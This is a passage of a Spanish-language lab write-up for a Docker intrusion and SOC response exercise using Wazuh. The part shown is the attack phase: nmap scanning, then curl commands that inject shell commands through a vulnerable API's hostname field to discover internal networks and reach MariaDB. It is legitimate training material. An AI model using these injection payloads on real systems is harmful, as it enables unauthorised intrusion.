
<div align="center">

# 🛡️ Docker Intrusion & SOC Response: API, MariaDB and Lateral Movement , Active Response (IA)

### API exploitation – Compromised credentials – Attack detection

**`Wazuh`** `·` **`Kali Linux`** `·` **`Docker`** `·` **`Mittre At&ck`**

---

🔴 **Ataque** &nbsp;→&nbsp; 🔵 **Detección** &nbsp;→&nbsp; 🟢 **Respuesta**

</div>



## 📌 Objetivo

El objetivo de este caso es crear, analizar y responder  una intrusión de múltiples etapas dentro de una infraestructura basada en Docker, desde la perspectiva de Ataque-Detecion-Respuesta

El escenario parte de una API vulnerable desplegada sobre Docker en un servidor Ubuntu, utilizada como punto de acceso inicial. A partir de este acceso, la actividad progresa hacia la exploración del entorno Docker y el acceso a un contenedor MariaDB, donde se encuentra información relacionada con activos, usuarios y credenciales.

La obtención de credenciales permite continuar la cadena de ataque mediante técnicas de Credential Access, recuperación de credenciales y un posterior intento de Lateral Movement hacia otros sistemas de la infraestructura.

Durante el desarrollo del incidente, el SOC utiliza Wazuh para monitorear la actividad, generar alertas mediante reglas personalizadas, utilizar playbooks para responder ante incidentes, investigar los eventos y relacionar las distintas acciones con técnicas de MITRE ATT&CK.


## :triangular_ruler: Arquitectura

El laboratorio SOC cuenta con dos redes segmentadas, separando el entorno de ataque del entorno de monitoreo.

- Red de Laboratorio: contiene los endpoints y servicios donde se desarrolla el escenario de ataque. En esta etapa, Kali Linux actúa como atacante y Ubuntu Server como objetivo, alojando la API vulnerable, Docker y MariaDB.

- Red de Estudio / SOC: contiene la infraestructura utilizada para monitorear, analizar y responder a los eventos generados en la red de laboratorio, principalmente mediante Wazuh.
  
<div>
<img width="1800" height="803" alt="Diagrama Caso2#" src="https://github.com/user-attachments/assets/1df88b4b-85ba-48ab-9ae4-a9fb0cfd5a39" />
</div>

------

## Herramientas y Tecnologías

 ![Ubuntu](https://img.shields.io/badge/Ubuntu-Server-E95420?style=flat-square&logo=ubuntu&logoColor=white)

 ![Docker](https://img.shields.io/badge/Docker-Containerization-2496ED?style=flat-square&logo=docker&logoColor=white)

 ![Python](https://img.shields.io/badge/Python-API%20Development-3776AB?style=flat-square&logo=python&logoColor=white)

 ![MariaDB](https://img.shields.io/badge/MariaDB-Database-003545?style=flat-square&logo=mariadb&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-SIEM%20%26%20Monitoring-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-Custom%20Rules-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-Playbooks-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-Framework-FF0000?style=flat-square&logoColor=white)

 ![Kali Linux](https://img.shields.io/badge/Kali%20Linux-Red%20Team-557C94?style=flat-square&logo=kalilinux&logoColor=white)

 ![John](https://img.shields.io/badge/John%20the%20Ripper-Credential%20Cracking-FFD700?style=flat-square&logoColor=black)

 ![Hashcat](https://img.shields.io/badge/Hashcat-Credential%20Cracking-FFD700?style=flat-square&logoColor=black)


  ## :small_red_triangle_down: Escenario Red de Laboratorio (Escenario de Attaque) 

Esta sección documenta la fase ofensiva del de este desde la perspectiva del atacante. Kali Linux actúa como origen del ataque contra la Red de Laboratorio, con el objetivo de vulnerar una API expuesta en Ubuntu Server, utilizarla como punto de pivote hacia el contenedor MariaDB, y obtener credenciales que permitan avanzar hacia el resto de la infraestructura.  


- ## Acceso Inicial 

En esta fase parto de una API expuesta en Ubuntu Server, sin saber todavía qué hay detrás de ella. El primer objetivo es lograr ejecución de comandos sobre el servidor, y una vez conseguido eso, empiezo a reconocer el entorno de red para entender dónde estoy parado y qué otros servicios podrían estar corriendo cerca


### ✅ [1.1] — Reconocimiento del servicio — Puerto de la API   

Antes de meterme con la API en sí, hago un barrido de puertos sobre la red del laboratorio para entender qué superficie tengo disponible. Con nmap -sV 192.168.3.0/24 escaneo todo el segmento y encuentro dos puertos de interés: 8080 , 3389

```
nmap -sV 192.168.3.0/24 
```
<div>

  <img width="1013" height="682" alt="paso2scan" src="https://github.com/user-attachments/assets/ea4d50a8-3adb-4029-a4b1-2e2c6fb1fdbe" />


</div>

----

### ✅ [1.2] — Command Injection 

Con el puerto 8080 identificado, pruebo el endpoint /check-host, que recibe un parámetro hostname. Noto que no sanitiza la entrada, así que inyecto un comando separado por ;. El resultado confirma ejecución de comandos sobre el servidor. 

```
 curl -X POST [http://192.168.3.100:8080/check-host](http://192.168.3.100:8080/check-host) -H "Content-Type: application/json" -d '{"hostname":"8.8.8.8; whoami"}'
```


<div>

  <img width="1002" height="119" alt="paso 1 2" src="https://github.com/user-attachments/assets/bdbe3907-845d-4f9d-8d98-efe0b13ddada" />

</div> 


----

### ✅ [1.3] — Network Discovery 

Con ejecución de comandos confirmada, reutilizo el mismo canal para reconocer la red interna. Consulto la tabla de rutas del sistema y aparece un segmento 172.18.0.0/16 que no es el de la red del laboratorio — es la red interna de Docker, lo que me indica que hay contenedores corriendo detrás de la API.



```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; cat /proc/net/fib_trie"}'
```
<div>
  
<img width="994" height="264" alt="paso1 3" src="https://github.com/user-attachments/assets/57bc98a0-d059-4814-b5ba-fbcf548f5174" />

</div> 


----

### ✅ [1.4] — Host Discovery

Con la red interna identificada, escaneo el segmento para localizar hosts activos y detectar nuevos objetivos. Busco identificar qué sistemas están disponibles para continuar avanzando desde el punto comprometido. 


```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; ping -c 1 172.18.0.3"}'
```
<div>
  
<img width="1009" height="147" alt="paso 1 4" src="https://github.com/user-attachments/assets/c2b85393-9643-4d86-a7eb-0dda5d607dc0" />


</div>


---

### ✅ [1.5] — Service Discovery 

Con el host 172.18.0.3 identificado, verifico la disponibilidad del puerto 3306 para determinar si existe un servicio de base de datos accesible. La respuesta confirma que el servicio MariaDB está expuesto y permite continuar con la siguiente etapa del ataque.  


```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; nc -zv 172.18.0.3 3306"}'
```

<div>

<img width="1009" height="139" alt="paso 1 5" src="https://github.com/user-attachments/assets/b34603f0-433d-4c0e-8608-9b5780f053fd" />

  
</div>

----

### ✅ [1.6] — Database Access

Con MariaDB identificado en 172.18.0.3:3306, intento establecer una conexión directa desde el sistema comprometido. Ejecuto SELECT 1 para validar que la base de datos acepta la conexión y que puedo interactuar con ella.

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -e \"SELECT 1;\""}'
```

<div>

  <img width="1009" height="160" alt="pas 1 6" src="https://github.com/user-attachments/assets/b6d3b392-c13d-4040-b9f2-4dda6837fd26" />

</div>


